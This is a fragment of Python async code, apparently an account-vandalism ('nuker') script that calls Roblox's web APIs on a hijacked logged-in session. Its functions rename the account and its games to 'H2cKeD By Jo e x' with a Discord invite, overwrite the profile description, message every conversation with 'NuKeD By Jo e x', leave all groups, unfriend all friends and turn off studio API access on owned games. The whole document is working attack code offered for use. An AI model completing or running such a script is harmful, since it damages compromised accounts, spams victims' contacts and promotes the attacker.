...
async def change_name(session, id):
    async with session.get(f"https://users.roblox.com/v1/users/{id}/display-names/validate?displayName=aaaaa", ssl=False) as response:
        if response.status == 200:
            async with session.patch(f"https://users.roblox.com/v1/users/{id}/display-names", json={"newDisplayName": "H2cKeDByJoex"}, ssl=False) as response:
                if response.status == 200:
...
async def change_desc(session):
    async with session.post("https://users.roblox.com/v1/description", json={"description": "H2cKeD By Jo e x .gg/ma7"}, ssl=False) as response:
        if response.status == 200:
...
async def get_convs(session):
    async with session.get("https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000", ssl=False) as response:
        if response.status == 200:
            ...
            cprint.success("Gathered user conversations!")
            return data
        else:
...
async def send_message(session, conv):
    async with session.post("https://chat.roblox.com/v2/send-message", json={"conversationId": conv["id"], "message": "NuKeD By Jo e x"}, ssl=False) as response:
        if response.status == 200:
            data = await response.json()
...
async def leave_groups(session, group, id):
    ...
    async with session.delete(f"https://groups.roblox.com/v1/groups/{group_id}/users/{id}", ssl=False) as response:
        if response.status == 200:
            cprint.success(f"Left group: {group_name}")
        else:
...
async def get_friends(session, id):
    async with session.get(f"https://friends.roblox.com/v1/users/{id}/friends", ssl=False) as response:
        if response.status == 200:
            ...
            cprint.success(f"Gathered {len(friends)} friend")
            return friends
        else:
...
async def fast_unfriend(session, friend):
    ...
    async with session.post(f"https://friends.roblox.com/v1/users/{friend_id}/unfriend", ssl=False) as response:
        if response.status == 200:
            cprint.success(f"Unfriended {friend_name}")
        else:
...
async def modify_game(session, id):
    async with session.patch(f"https://develop.roblox.com/v2/universes/{id}/configuration", json={"name":"H2cKeD By Mr Joex .gg/ma7","description":"disc disc.gg/ma7","studioAccessToApisAllowed":False}, ssl=False) as response:
        if response.status == 200:
        ...
        async with session.get(f"https://games.roblox.com/v2/users/{id}/games?limit=50&sortOrder=Asc&cursor={cursor}", ssl=False) as response:
            if response.status == 200:
                ...
                if data.get("nextPageCursor"):
                    ...
                    cprint.success(f"Gathered {len(total_games)} owned games")
                    return total_games
            else:
